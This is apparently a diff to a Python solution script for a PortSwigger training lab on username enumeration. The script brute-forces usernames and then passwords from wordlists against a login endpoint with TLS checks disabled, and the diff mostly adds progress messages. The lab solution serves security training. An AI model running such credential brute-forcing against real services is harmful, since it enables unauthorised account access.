@@ -3,6 +3,7 @@
 # Lab-Link: <https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses>
 # Difficulty: PRACTITIONER
 import requests
+import shutil
 import sys
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -37,9 +38,15 @@ def enumerate_username(url, username_filename):
     with open(username_filename, 'r') as infile:
         for line in infile:
             username = line.rstrip()
+            msg = f'[ ] Brute force username: {username}'
+            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
             if login(url, username, 'XXX') == 2:
+                msg = f'[+] Username found: {username}'
+                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                 return username
 
+    msg = f'[-] Failed to find username'
+    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
     return False
 
 
@@ -47,20 +54,27 @@ def enumerate_password(url, username, passwords_filename):
     with open(passwords_filename, 'r') as infile:
         for line in infile:
             password = line.rstrip()
+            msg = f'[ ] Brute force password: {password}'
+            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\r', flush=True)
             if login(url, username, password) == 3:
+                msg = f'[+] Password found: {password}'
+                print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
                 return password
+    msg = f'[-] Failed to find password'
+    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg) - 1)}', end='\n', flush=True)
     return False
 
 
 def verify_login(url, username, password):
     data = {'username': username, 'password': password}
     r = requests.post(url, data=data, verify=False, proxies=proxies)
-    if 'Congratulations, you solved the lab!' in r.text:
+    if f'Your username is: {username}' in r.text:
         return True
     return False
 
 
 def main():
+    print('[+] Username enumeration via subtly different responses')
     try:
         host = sys.argv[1].strip().rstrip('/')
     except IndexError:
@@ -68,20 +82,14 @@ def main():
         print(f'Exampe: {sys.argv[0]} http://www.example.com')
         sys.exit(-1)
 
-    print(f'[ ] Brute force username and password')
-
     url = f'{host}/login'
     username = enumerate_username(f'{url}', '../candidate_usernames.txt')
     if not username:
-        print(f'[-] Failed to enumerate username')
         sys.exit(-2)
-    print(f'[+] Found username: {username}')
 
     password = enumerate_password(f'{url}', username, '../candidate_passwords.txt')
     if not password:
-        print(f'[-] Failed to enumerate password')
         sys.exit(-3)
-    print(f'[+] Found password: {password}')
 
     if verify_login(url, username, password):
         print(f'[+] Login successful, lab solved')
